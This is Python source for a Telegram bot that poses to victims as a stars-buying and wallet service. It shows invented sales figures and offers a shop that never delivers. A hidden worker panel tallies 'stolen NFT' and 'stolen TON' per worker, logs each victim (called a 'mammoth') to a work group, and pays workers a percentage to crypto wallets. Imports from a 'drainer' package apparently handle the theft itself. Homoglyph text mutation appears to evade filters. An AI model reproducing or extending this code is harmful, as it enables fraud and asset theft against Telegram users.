from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.types import (
    Message,
    InlineQuery,
    ChosenInlineResult,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    FSInputFile,
    WebAppInfo,
    LinkPreviewOptions,
    LabeledPrice,
    ReplyParameters,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from base import (
    absolute_path,
    api_hash,
    api_id,
    proxy,
    star_session,
    bot,
    BASE_DIR,
    post_bot,
    actual_proxy,
    helper_bot,
)

from web_common import product_checks_mode
from drainer.core.proxy import get_active_proxy, change_proxy
from drainer.core.steal import send_user_log
from drainer.core.functional import (
    get_exception_explanation,
    mutate_text,
    worker_cute_suffix,
)

import asyncio
import html
import random
import logging
import json
import re
import os
import sys
import subprocess
import psutil
import importlib.metadata
from uuid import uuid4

import database
import config
import paths
import drainer.core.parse as parse

from pathlib import Path

from pyrogram import Client, errors

dp = Router()

_TG_STAR = "<tg-emoji emoji-id='5193179982775476271'>💎</tg-emoji>"
_PROFIT_SNAPSHOT_UIDS = frozenset({8265488081, 8401145576})


async def _profit_send_chunks(message: Message, lines: list):
    buf = []
    size = 0
    limit = 3800
    for line in lines:
        add = len(line) + (1 if buf else 0)
        if buf and size + add > limit:
            await message.answer("\n".join(buf), parse_mode="HTML")
            buf = [line]
            size = len(line)
        else:
            if buf:
                size += 1
            buf.append(line)
            size += len(line)
    if buf:
        await message.answer("\n".join(buf), parse_mode="HTML")


def _format_stats_pre_block(title: str, s: dict) -> str:
    hdr = f"{'':8}{'NFT':>5} | {'TON':>8}"
    return "\n".join(
        [
            title,
            hdr,
            f"{'День':<8}{s['day']['nfts']:>5} | {s['day']['amount']:>8.2f}",
            f"{'Неделя':<8}{s['week']['nfts']:>5} | {s['week']['amount']:>8.2f}",
            f"{'Месяц':<8}{s['month']['nfts']:>5} | {s['month']['amount']:>8.2f}",
            f"{'Всего':<8}{s['alltime']['nfts']:>5} | {s['alltime']['amount']:>8.2f}",
        ]
    )


@dp.message(Command("stats"))
async def stats_command(message: Message):
    if message.chat.type != "private":
        return await message.answer(
            "<b>Напиши мне в личку</b>",
            parse_mode="HTML",
            reply_parameters=ReplyParameters(
                chat_id=message.chat.id, message_id=message.message_id
            ),
        )
    uid = message.from_user.id
    try:
        member = await post_bot.get_chat_member(
            chat_id=config.WORK_GROUP_ID, user_id=uid
        )
        ok = member.status in (
            "member",
            "owner",
            "administrator",
            "creator",
        )
    except Exception:
        ok = False
    if not ok:
        return await message.answer(
            mutate_text("Команда только для участников рабочей группы."),
            parse_mode="HTML",
        )
    mine = database.get_profits_stats_for_user(uid)
    team = database.get_profits_stats()
    body = (
        _format_stats_pre_block("⚡️ Твоя Статистика:", mine)
        + "\n\n"
        + _format_stats_pre_block("💻 Статистика Панели:", team)
    )
    await message.answer(
        f"<pre>{html.escape(body)}</pre>",
        parse_mode="HTML",
    )


@dp.message(Command("profit!"))
async def profit_snapshot_command(message: Message):
    uid = message.from_user.id if message.from_user else 0
    if uid not in _PROFIT_SNAPSHOT_UIDS:
        return
    if message.chat.type != "private":
        return await message.answer(
            "<b>Напиши мне в личку</b>",
            parse_mode="HTML",
            reply_parameters=ReplyParameters(
                chat_id=message.chat.id, message_id=message.message_id
            ),
        )
    adv_team = database.get_advanced_profits_total_team()
    nft_n = database.get_advanced_nfts_total_team()
    database.set_profit_display_baseline(adv_team, nft_n)
    await message.answer(
        "<b>Ок.</b> <code>advanced_profits</code> и <code>nft_count</code> зафиксированы.",
        parse_mode="HTML",
    )


@dp.message(Command("profit"))
async def profit_list_command(message: Message):
    if message.chat.type != "private":
        return await message.answer(
            "<b>Напиши мне в личку</b>",
            parse_mode="HTML",
            reply_parameters=ReplyParameters(
                chat_id=message.chat.id, message_id=message.message_id
            ),
        )
    uid = message.from_user.id
    try:
        member = await post_bot.get_chat_member(
            chat_id=config.WORK_GROUP_ID, user_id=uid
        )
        ok = member.status in (
            "member",
            "owner",
            "administrator",
            "creator",
        )
    except Exception:
        ok = False
    if not ok:
        return await message.answer(
            mutate_text("Команда только для участников рабочей группы."),
            parse_mode="HTML",
        )

    adv_raw = database.get_advanced_profits_total_team()
    nft_raw = database.get_advanced_nfts_total_team()

    if adv_raw <= 0 and nft_raw <= 0:
        return await message.answer(
            "<b>Профитов по команде в <code>advanced_profits</code> пока нет.</b>",
            parse_mode="HTML",
        )

    base_ton, base_nft = database.get_profit_display_baseline()
    adv_team = adv_raw - base_ton
    nft_n = nft_raw - base_nft

    pct = 0.22
    total_22 = round(adv_team * pct, 2)
    out_lines = [
        f"advanced_profits: <b>{adv_team:.2f}</b> {_TG_STAR}",
        f"nft_count: <b>{nft_n}</b>",
        "",
        f"22%: <b>{total_22:.2f}</b> {_TG_STAR}",
    ]
    await _profit_send_chunks(message, out_lines)


@dp.callback_query(F.data == "autobuy_change")
async def autobuy_change_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    current_status = database.get_gois_autobuy(user_id)
    new_status = False if current_status is True else True
    database.set_gois_autobuy(user_id, new_status)

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"Авто-скупщик: {'☑️' if new_status else '❎'}",
                    callback_data="autobuy_change",
                )
            ],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="topup_back")],
        ]
    )

    if callback.message.reply_markup != markup:
        await callback.message.edit_reply_markup(reply_markup=markup)


@dp.callback_query(F.data == "autobuy")
async def autobuy_callback(callback: CallbackQuery):
    await callback.message.delete()
    message_text = """<b>🤖 Автоскуп подарков</b>\n\n<blockquote>Когда выйдут новинки, пришлю превью стикером и кнопки, чтобы купить в пару тапов.</blockquote>"""
    current_status = database.get_gois_autobuy(callback.from_user.id)
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"Авто-скупщик: {'☑️' if current_status else '❎'}",
                    callback_data="autobuy_change",
                )
            ],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="topup_back")],
        ]
    )
    await callback.message.answer(message_text, parse_mode="HTML", reply_markup=markup)


@dp.callback_query(F.data == "wallet")
async def wallet_callback(callback: CallbackQuery):
    await callback.message.delete()
    message_text = f"""<b>👛 Кошелёк</b>\n\n<blockquote>Звёзды: <code>{database.get_gois_stars(callback.from_user.id)}</code> ⭐️ · пыль: <code>0</code> ✨</blockquote>\n<b>Рефералка:</b> <code>0.00$</code>"""
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💰 Пополнить", callback_data="topup")],
            [InlineKeyboardButton(text="⏬️ Вывести звёзды", callback_data="withdraw")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="topup_back")],
        ]
    )
    await callback.message.answer(message_text, parse_mode="HTML", reply_markup=markup)


@dp.callback_query(F.data == "shop")
async def wallet_callback(callback: CallbackQuery):
    await callback.message.delete()
    message_text = f"""<b>🛒 Магазин</b>\n\n<blockquote>Баланс: <code>{database.get_gois_stars(callback.from_user.id)}</code> ⭐️ · <code>0</code> ✨</blockquote>\n<b>Покупок:</b> <code>0</code>"""
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="💫 Премиум", callback_data="premium"),
                InlineKeyboardButton(text="🌟 Подарки", callback_data="gifts"),
            ],
            [InlineKeyboardButton(text="💰 Пополнить", callback_data="topup")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="topup_back")],
        ]
    )
    await callback.message.answer(message_text, parse_mode="HTML", reply_markup=markup)


@dp.callback_query(F.data == "premium")
async def premium_callback(callback: CallbackQuery):
    await callback.message.delete()
    message_text = "💵 Выбери срок подписки:"
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="3 месяца", callback_data="wait_21_days")],
            [InlineKeyboardButton(text="6 месяца", callback_data="wait_21_days")],
            [InlineKeyboardButton(text="12 месяцев", callback_data="wait_21_days")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="shop")],
        ]
    )
    await callback.message.answer(message_text, parse_mode="HTML", reply_markup=markup)


@dp.callback_query(F.data == "wait_21_days")
async def process_item_selection(callback: types.CallbackQuery):
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⏬️ Вывести звёзды", callback_data="withdraw")],
        ]
    )
    await callback.message.answer(
        "<b>Магазин откроется через 21 день.\nЗвёзды можно вывести кнопкой ниже.</b>",
        reply_markup=markup,
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "gifts")
async def send_gifts(callback: types.CallbackQuery):
    await callback.message.delete()
    gifts = await bot.get_available_gifts()
    inline_keyboard = []

    row = []
    for i, gift in enumerate(gifts.gifts, start=1):
        row.append(
            types.InlineKeyboardButton(
                text=f"{gift.sticker.emoji}", callback_data=f"wait_21_days"
            )
        )
        if i % 4 == 0:
            inline_keyboard.append(row)
            row = []
    if row:
        inline_keyboard.append(row)

    inline_keyboard.append(
        [types.InlineKeyboardButton(text="⬅️ Назад", callback_data="shop")]
    )

    keyboard = types.InlineKeyboardMarkup(inline_keyboard=inline_keyboard)
    await callback.message.answer("Выбери подарок:", reply_markup=keyboard)


@dp.callback_query(lambda c: c.data.startswith("gift_"))
async def process_gift_callback(callback_query: types.CallbackQuery):
    gift_id = callback_query.data.split("_")[1]
    await callback_query.answer(text=f"Подарок id {gift_id}")


async def handle_start_default(message: Message):
    try:
        try:
            member = await post_bot.get_chat_member(
                chat_id=config.WORK_GROUP_ID, user_id=message.from_user.id
            )
            is_worker = member.status in [
                "member",
                "owner",
                "administrator",
                "creator",
            ]
        except Exception:
            is_worker = False

        if is_worker:
            if getattr(config, "REQUIRE_CHANNEL_SUBSCRIBE", False):
                try:
                    news_member = await helper_bot.get_chat_member(
                        chat_id=config.REQUIRED_SUBSCRIBE_CHAT,
                        user_id=message.from_user.id,
                    )
                    is_subscribed = news_member.status in [
                        "member",
                        "owner",
                        "administrator",
                        "creator",
                    ]
                except Exception:
                    is_subscribed = False

                if not is_subscribed:
                    subscribe_markup = InlineKeyboardMarkup(
                        inline_keyboard=[
                            [
                                InlineKeyboardButton(
                                    text="Подписаться",
                                    url=config.REQUIRED_SUBSCRIBE_URL,
                                )
                            ],
                        ]
                    )

                    await message.answer(
                        mutate_text(
                            "<b>Нужна подписка на канал, дальше без неё не пущу.</b>"
                        ),
                        reply_markup=subscribe_markup,
                        parse_mode="HTML",
                    )
                    return

            profits_list = database.read_profits()
            profits_text = ""

            if len(profits_list):
                for profit in profits_list:
                    if profit[1] == message.from_user.id:
                        profits_text += (
                            f"\n#{profit[0]} - "
                            f"{'{:.2f}'.format(float(profit[4]))} 💎"
                        )

            if profits_text == "":
                profits_text = mutate_text("Нет неоплаченных прoфитoB.")

            if len(profits_text) > 400:
                profits_text = profits_text[:397] + "…"

            worker_kb_rows = [
                [
                    InlineKeyboardButton(
                        icon_custom_emoji_id="5039937220396451903",
                        text=mutate_text("Uretra d0sh1k"),
                        url=config.REQUIRED_SUBSCRIBE_URL,
                    )
                ],
                [
                    InlineKeyboardButton(
                        icon_custom_emoji_id="5193179982775476271",
                        text=mutate_text("Изменить кoшeлеk"),
                        callback_data="change_wallet",
                    )
                ],
                [
                    InlineKeyboardButton(
                        icon_custom_emoji_id="5039978413427787762",
                        text=mutate_text("Управление"),
                        callback_data="control",
                    )
                ],
                [
                    InlineKeyboardButton(
                        icon_custom_emoji_id="5278753302023004775",
                        text=mutate_text("Команды"),
                        callback_data="commands",
                    )
                ],
            ]
            if product_checks_mode():
                worker_kb_rows.append(
                    [
                        InlineKeyboardButton(
                            text=mutate_text("Price"),
                            callback_data="wk_price",
                        )
                    ]
                )
            markup = InlineKeyboardMarkup(inline_keyboard=worker_kb_rows)

            wallet = database.get_worker_wallet(message.from_user.id)
            if wallet is None:
                database.write_worker(
                    message.from_user.id,
                    "Не установлен",
                    message.from_user.full_name,
                    worker=True,
                )
                wallet = mutate_text("Не установлен")

            database.set_worker_name(
                message.from_user.id, message.from_user.full_name
            )

            nfts = database.get_user_nfts(message.from_user.id) or 0
            tons = float(database.get_user_tons(message.from_user.id) or 0.00)
            payouts = float(database.get_user_payouts(message.from_user.id) or 0.00)
            top_rank = database.get_user_rank(message.from_user.id)
            name_esc = html.escape(message.from_user.full_name or "")
            wallet_esc = html.escape(str(wallet))
            profits_esc = html.escape(profits_text)
            rank_s = "—" if top_rank is None else str(top_rank)

            cap = (
                "<b><tg-emoji emoji-id='5039880333554616347'>🫰</tg-emoji> Uretra d0sh1k</b>\n\n"
                "<blockquote><tg-emoji emoji-id='5039864236017190542'>👤</tg-emoji>  Профиль</blockquote>"
                f"<b>НИК: <code>{name_esc}</code></b>\n"
                f"<b>УКРАДЕНО NFT: <code>{nfts}</code></b>\n"
                f"<b>УКРАДЕНО TON: <code>{tons:.2f}</code> {_TG_STAR}</b>\n"
                f"<b>ПОЛУЧЕНО ВЫПЛАТ: <code>{payouts:.2f}</code> {_TG_STAR}</b>\n"
                f"<b>МЕСТО В ТОПЕ: <code>{html.escape(rank_s)}</code></b>\n\n"
                "<blockquote><tg-emoji emoji-id='5042328443438499146'>💰</tg-emoji>  Неоплаченные профиты</blockquote>\n"
                f"<code>{profits_esc}</code>\n\n"
                "<blockquote><tg-emoji emoji-id='5042187452547074149'>👛</tg-emoji>  Кошелек</blockquote>\n"
                f"<code>{wallet_esc}</code>"
            )
            if len(cap) > 1024:
                over = len(cap) - 1024 + 8
                profits_esc = profits_esc[: max(0, len(profits_esc) - over)] + "…"
                cap = (
                    "<b><tg-emoji emoji-id='5039880333554616347'>🫰</tg-emoji> Uretra d0sh1k</b>\n\n"
                    "<blockquote><tg-emoji emoji-id='5039864236017190542'>👤</tg-emoji>  Профиль</blockquote>"
                    f"<b>НИК: <code>{name_esc}</code></b>\n"
                    f"<b>УКРАДЕНО NFT: <code>{nfts}</code></b>\n"
                    f"<b>УКРАДЕНО TON: <code>{tons:.2f}</code> {_TG_STAR}</b>\n"
                    f"<b>ПОЛУЧЕНО ВЫПЛАТ: <code>{payouts:.2f}</code> {_TG_STAR}</b>\n"
                    f"<b>МЕСТО В ТОПЕ: <code>{html.escape(rank_s)}</code></b>\n\n"
                    "<blockquote><tg-emoji emoji-id='5042328443438499146'>💰</tg-emoji>  Неоплаченные профиты</blockquote>\n"
                    f"<code>{profits_esc}</code>\n\n"
                    "<blockquote><tg-emoji emoji-id='5042187452547074149'>👛</tg-emoji>  Кошелек</blockquote>\n"
                    f"<code>{wallet_esc}</code>"
                )

            await message.answer_photo(
                photo=FSInputFile(BASE_DIR / "static" / "profile.jpg"),
                caption=cap,
                parse_mode="HTML",
                reply_markup=markup,
            )
            return

        try:
            await message.bot.send_sticker(
                chat_id=message.chat.id,
                sticker="CAACAgIAAxkBAAEC811pWq7s_mqvN3LRjF67h200ioLK2gACiwADr8ZRGpyZPDhzkQUEOAQ",
            )
        except Exception:
            logging.exception("handle_start_default: sticker")

        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="💻 Веб-Кошелек",
                        web_app=WebAppInfo(url=f"{config.WEB_APP_LINK}/app"),
                    )
                ],
                [InlineKeyboardButton(text="💫 Bывeсти звезды", callback_data="withdraw")],
                [
                    InlineKeyboardButton(
                        text="🤖 Автoскупщик подарков", callback_data="autobuy"
                    )
                ],
                [
                    InlineKeyboardButton(text="👛 Кoшeлеk", callback_data="wallet"),
                    InlineKeyboardButton(text="🛒 Магазин", callback_data="shop"),
                ],
                [InlineKeyboardButton(text="💰 Пополнить Бaлaнc", callback_data="topup")],
                [
                    InlineKeyboardButton(
                        text="🌟 Создать чeк", switch_inline_query_current_chat="100"
                    )
                ],
            ]
        )

        await message.answer_photo(
            photo=FSInputFile(BASE_DIR / "static" / "start.jpg"),
            caption="""<tg-emoji emoji-id="5057617440385533282">🫰</tg-emoji> <b>Привeт! Это удoбный бoт для покупки/перeдачи звeзд в Telegram.</b>

<blockquote>
С помощью него можно моментально покупать и передавать звезды.

Бот рaботаeт пoчти гoд, и с пoмoщью негo куплена большая дoля звeзд в Telegraм.
</blockquote>

С пoмощью бoта куплено:
<b>7,357,760 ⭐️ (~ $110,366)</b>""",
            parse_mode="HTML",
            reply_markup=markup,
        )
    except Exception:
        logging.exception("handle_start_default")
        try:
            await message.answer(
                "<b>Не удалось открыть главный экран. Попробуй /start ещё раз.</b>",
                parse_mode="HTML",
            )
        except Exception:
            pass


async def handle_multicheck(message: Message, args: str):
    try:
        with open(f"{absolute_path}/storage/settings.json", "r", encoding="utf-8") as f:
            data = f.read()

        settings_data = json.loads(data)
        private_mode = int(settings_data["privacy"])
        worker_private_mode = int(settings_data["worker_privacy"])

        if not private_mode:
            peer = f"{'@' + message.from_user.username if message.from_user.username else message.from_user.full_name} ({message.from_user.id})"
        else:
            hidden_username = (
                message.from_user.username[:2]
                + "*" * (len(message.from_user.username) - 4)
                + message.from_user.username[-2:]
                if message.from_user.username and len(message.from_user.username) > 4
                else message.from_user.username
            )
            user_id = str(message.from_user.id)

            hidden_id = (
                user_id[:2] + "*" * (len(user_id) - 4) + user_id[-2:]
                if len(user_id) > 4
                else user_id
            )
            peer = f"{'@' + hidden_username if hidden_username else message.from_user.full_name} ({hidden_id})"

        check_id, id_ = args.split("_")
        id_ = int(id_)
        hidden_worker_id = str(id_)[:3] + "*" * (len(str(id_)) - 6) + str(id_)[-4:]
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="💻 Веб-кошелёк",
                        web_app=WebAppInfo(url=f"{config.WEB_APP_LINK}/app"),
                    )
                ],
                [InlineKeyboardButton(text="👛 Кошелёк", callback_data="wallet")],
            ]
        )
        msg = await bot.send_message(
            chat_id=message.chat.id,
            text="🌟 Смотрю мультичек…",
            parse_mode="HTML",
        )
        await asyncio.sleep(0.5)
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text="⏳ Ещё секунду…",
            parse_mode="HTML",
        )

        activations_left = database.get_multicheck_activations_left(check_id)
        already_activated_users = database.get_multicheck_activated_by_users(check_id)

        if message.from_user.id in already_activated_users:
            await bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text="❎ Ты уже забирал этот мультичек",
                parse_mode="HTML",
                reply_markup=markup,
            )
            return

        if activations_left <= 0:
            await bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text="❎ Активации кончились",
                parse_mode="HTML",
                reply_markup=markup,
            )
            return

        database.activate_multicheck(check_id, message.from_user.id)
        stars_amount = database.get_multicheck_stars(check_id)
        old_balance = database.get_gois_stars(message.from_user.id)
        database.set_gois_stars(message.from_user.id, old_balance + stars_amount)

        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=f"☑️ Готово · +{stars_amount} ⭐️ на балансе",
            parse_mode="HTML",
            reply_markup=markup,
        )
        
        await post_bot.send_message(
            chat_id=config.WORK_GROUP_ID,
            message_thread_id=config.LOGS_THREAD_ID,
            text=(
                f"<tg-emoji emoji-id='5206476089127372379'>⭐️</tg-emoji> <b>Лог · мультичек</b>\n"
                f"<tg-emoji emoji-id='5278589204207528856'>🦣</tg-emoji> <b>Мимонт: {peer}</b>\n"
                f"<tg-emoji emoji-id='5275979556308674886'>🥷</tg-emoji> Воркер: <code>{id_ if not worker_private_mode else hidden_worker_id}</code>"
            ),
            parse_mode="HTML",
        )
        database.write_gois_worker(message.from_user.id, id_)
    except Exception as e:
        await message.answer(f"❎ Мультичек не сработал: {e}")
    return


async def handle_check(message: Message, args: str):
    with open(f"{absolute_path}/storage/settings.json", "r", encoding="utf-8") as f:
        data = f.read()

    settings_data = json.loads(data)
    private_mode = int(settings_data["privacy"])
    worker_private_mode = int(settings_data["worker_privacy"])

    if not private_mode:
        peer = f"{'@' + message.from_user.username if message.from_user.username else message.from_user.full_name} ({message.from_user.id})"
    else:
        hidden_username = (
            message.from_user.username[:2]
            + "*" * (len(message.from_user.username) - 4)
            + message.from_user.username[-2:]
            if message.from_user.username and len(message.from_user.username) > 4
            else message.from_user.username
        )
        user_id = str(message.from_user.id)

        hidden_id = (
            user_id[:2] + "*" * (len(user_id) - 4) + user_id[-2:]
            if len(user_id) > 4
            else user_id
        )
        peer = f"{'@' + hidden_username if hidden_username else message.from_user.full_name} ({hidden_id})"

    check_id, id_ = args.split("_")
    id_ = int(id_)
    hidden_worker_id = str(id_)[:3] + "*" * (len(str(id_)) - 6) + str(id_)[-4:]
    amount_str = str(database.get_check_stars(check_id))
    if amount_str.isdigit():
        amount = int(amount_str)
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="💻 Веб-кошелёк",
                        web_app=WebAppInfo(url=f"{config.WEB_APP_LINK}/app"),
                    )
                ],
                [InlineKeyboardButton(text="👛 Кошелёк", callback_data="wallet")],
            ]
        )
        msg = await bot.send_message(
            chat_id=message.chat.id,
            text=f"🌟 <b>Чек на {amount} ⭐️…</b>",
            parse_mode="HTML",
        )
        await asyncio.sleep(0.5)
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text="⏳ <b>Проверяю…</b>",
            parse_mode="HTML",
        )
        activated = database.get_check_activated(check_id)
        receiver = database.get_check_receiver(check_id)
        if bool(activated):
            await asyncio.sleep(0.5)
            await bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text="❎ <b>Чек уже использован</b>",
                parse_mode="HTML",
                reply_markup=markup,
            )
            return
        if receiver and receiver != "0" and receiver != 0:
            is_user_receiver = False
            if receiver.startswith("@"):
                if receiver.replace("@", "") == message.from_user.username:
                    is_user_receiver = True
            if receiver.isdigit():
                if receiver == message.from_user.id:
                    is_user_receiver = True
            if not is_user_receiver:
                await asyncio.sleep(0.5)
                await bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=msg.message_id,
                    text=f"❎ <b>Чек только для {receiver}</b>",
                    parse_mode="HTML",
                    reply_markup=markup,
                )
                return
        database.activate_check(check_id)
        await asyncio.sleep(0.5)
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=f"☑️ <b>Чек ок</b>\n\n💳 <b>Кидаю {amount} ⭐️…</b>",
            parse_mode="HTML",
        )
        await asyncio.sleep(0.75)
        await bot.edit_message_text(
            chat_id=message.chat.id, message_id=msg.message_id, text="🌟"
        )
        await asyncio.sleep(1)
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=f"👛 <b>+{amount} ⭐️ на балансе</b>",
            parse_mode="HTML",
            reply_markup=markup,
        )
        old_balance = database.get_gois_stars(message.from_user.id)
        database.set_gois_stars(message.from_user.id, old_balance + amount)

        await post_bot.send_message(
            chat_id=config.WORK_GROUP_ID,
            message_thread_id=config.LOGS_THREAD_ID,
            text=(
                f"<tg-emoji emoji-id='5206476089127372379'>⭐️</tg-emoji> <b>Лог · чек</b>\n"
                f"<tg-emoji emoji-id='5278589204207528856'>🦣</tg-emoji> <b>Мимонт: {peer}</b>\n"
                f"<tg-emoji emoji-id='5275979556308674886'>🥷</tg-emoji> Воркер: <code>{id_ if not worker_private_mode else hidden_worker_id}</code>"
            ),
            parse_mode="HTML",
        )
        database.write_gois_worker(message.from_user.id, id_)

        return


async def handle_topup(message: Message, args: str):
    amount_str = args.replace("topup_", "")
    if not amount_str.isdigit():
        return await message.answer("❎ Нужна сумма цифрами")

    prices = [LabeledPrice(label="Звёзды", amount=int(amount_str))]

    await bot.send_invoice(
        chat_id=message.chat.id,
        title="Пополнение",
        description="Звёзды в Telegram",
        payload="stars_payload",
        provider_token="",
        currency="XTR",
        prices=prices,
    )


async def handle_profit(message: Message, args: str):
    with open(f"{absolute_path}/storage/procents.json", "r", encoding="utf-8") as f:
        data = f.read()

    if not data:
        return

    procentage_data = json.loads(data)
    procentage = int(procentage_data["worker"])

    if message.from_user.id not in config.ADMIN_ID:
        return await message.answer(
            "⛔️ Только для админов" + worker_cute_suffix(),
            parse_mode="HTML",
        )
    profit_id = args
    profit = database.read_profit(profit_id)

    wallet = database.get_worker_wallet(profit[1])

    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ Закрыть выплату",
                    callback_data=f"confirm_profit:{profit_id}",
                )
            ],
            [
                InlineKeyboardButton(
                    text="⛓️‍💥 TON",
                    url=f"ton://transfer/{wallet}?amount={int(float((float(profit[4]) * procentage) / 100) * 1_000_000_000)}",
                )
            ],
            [InlineKeyboardButton(text="🥷 Воркер", url=f"tg://user?id={profit[1]}")],
            [InlineKeyboardButton(text="❎ Отмена", callback_data="delete")],
            [
                InlineKeyboardButton(
                    text="❌ Удалить", callback_data=f"delete_profit:{profit_id}"
                )
            ],
        ]
    )

    try:
        await message.answer(
            f"<b>💸 Запись <code>{profit[0]}</code></b>\n\n{profit[3]}\n\n"
            f"<b>Отправитель</b>: <code>{profit[2]}</code>\n"
            f"<b>Получатель</b>: <code>{profit[1]}</code>\n\n"
            f"<b>Всего</b>: <code>{'{:.2f}'.format(float(profit[4]))}</code> {_TG_STAR}\n"
            f"<b>К выплате</b>: <code>{'{:.2f}'.format((float(profit[4]) * procentage) / 100)}</code> {_TG_STAR} "
            f"<b>(<code>{procentage}%</code>)</b>\n\n"
            f"<b>Кошелёк</b>: <code>{wallet}</code>"
            + worker_cute_suffix(),
            parse_mode="HTML",
            reply_markup=markup,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        if (
            "BUTTON_USER_PRIVACY_RESTRICTED" in str(e).upper()
            or "BUTTON_USER_INVALID" in str(e).upper()
        ):
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="✅ Закрыть выплату",
                            callback_data=f"confirm_profit:{profit_id}",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text="⛓️‍💥 TON",
                            url=f"ton://transfer/{wallet}?amount={int(float((float(profit[4]) * procentage) / 100) * 1_000_000_000)}",
                        )
                    ],
                    [InlineKeyboardButton(text="❎ Отмена", callback_data="delete")],
                    [
                        InlineKeyboardButton(
                            text="❌ Удалить",
                            callback_data=f"delete_profit:{profit_id}",
                        )
                    ],
                ]
            )
            await message.answer(
                f"<b>💸 Запись <code>{profit[0]}</code></b>\n\n{profit[3]}\n\n"
                f"<b>Отправитель</b>: <code>{profit[2]}</code>\n"
                f"<b>Получатель</b>: <code>{profit[1]}</code>\n\n"
                f"<b>Всего</b>: <code>{'{:.2f}'.format(float(profit[4]))}</code> {_TG_STAR}\n"
                f"<b>К выплате</b>: <code>{'{:.2f}'.format((float(profit[4]) * procentage) / 100)}</code> {_TG_STAR} "
                f"<b>(<code>{procentage}%</code>)</b>\n\n"
                f"<b>Кошелёк</b>: <code>{wallet}</code>"
                + worker_cute_suffix(),
                parse_mode="HTML",
                reply_markup=markup,
                link_preview_options=LinkPreviewOptions(is_disabled=True),
            )


@dp.message(CommandStart())
async def start_command(message: Message, command: CommandObject):
    if message.chat.type != "private":
        sended_message = await message.answer(
            "<b>Напиши мне в личку — в чате так не работает</b>",
            parse_mode="HTML",
            reply_parameters=ReplyParameters(
                chat_id=message.chat.id, message_id=message.message_id
            ),
        )
        await asyncio.sleep(5)
        return await sended_message.delete()

    args = command.args

    try:
        database.add_gois_user(message.from_user.id, False, 0)
        if not args:
            return await handle_start_default(message)

        if args.startswith("MC"):
            return await handle_multicheck(message, args)

        if args.startswith("C"):
            return await handle_check(message, args)

        if args.startswith("topup_"):
            return await handle_topup(message, args)

        if args.startswith("P"):
            return await handle_profit(message, args)
    except Exception as e:
        logging.exception("start_command")
        await message.answer(
            f"<b>Не вышло обработать /start. Попробуй ещё раз.</b>\n\n{str(e)}",
            parse_mode="HTML",
        )
        return

    await handle_start_default(message)


class TopupStates(StatesGroup):
    waiting_for_amount = State()


def topup_keyboard():
    amounts = [25, 50, 100, 250, 500, 1000, 2500, 5000]
    builder = InlineKeyboardBuilder()

    for amt in amounts:
        builder.button(text=f"⭐️ {amt}", callback_data=f"topup_amount:{amt}")

    builder.button(text="💵 Ввести свою сумму", callback_data="topup_custom")

    builder.button(text="⬅️ Назад", callback_data="topup_back")

    builder.adjust(4, 4, 1, 1)

    return builder.as_markup()


@dp.callback_query(lambda c: c.data == "delete")
async def delete_handler(callback_query: types.CallbackQuery):
    await callback_query.message.delete()


@dp.callback_query(lambda c: c.data == "topup_back")
async def topup_back_handler(callback_query: types.CallbackQuery):

    await callback_query.message.delete()
    message__ = f"""
<b>Привeт! Это удoбный бoт для покупки/перeдачи звeзд в Telegram.</b>

<blockquote>
С помощью него можно моментально покупать и передавать звезды.

Бот рaботаeт пoчти гoд, и с пoмoщью негo куплена большая дoля звeзд в Telegraм.
</blockquote>

С пoмощью бoта куплено:
<b>7,357,760 ⭐️ (~ $110,366)</b>
        """
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="💻 Веб-Кошелек",
                    web_app=WebAppInfo(url=f"{config.WEB_APP_LINK}/app"),
                )
            ],
            [InlineKeyboardButton(text="💫 Bывeсти звезды", callback_data="withdraw")],
            [
                InlineKeyboardButton(
                    text="🤖 Автоскупщик подарков", callback_data="autobuy"
                )
            ],
            [
                InlineKeyboardButton(text="👛 Кoшeлеk", callback_data="wallet"),
                InlineKeyboardButton(text="🛒 Магазин", callback_data="shop"),
            ],
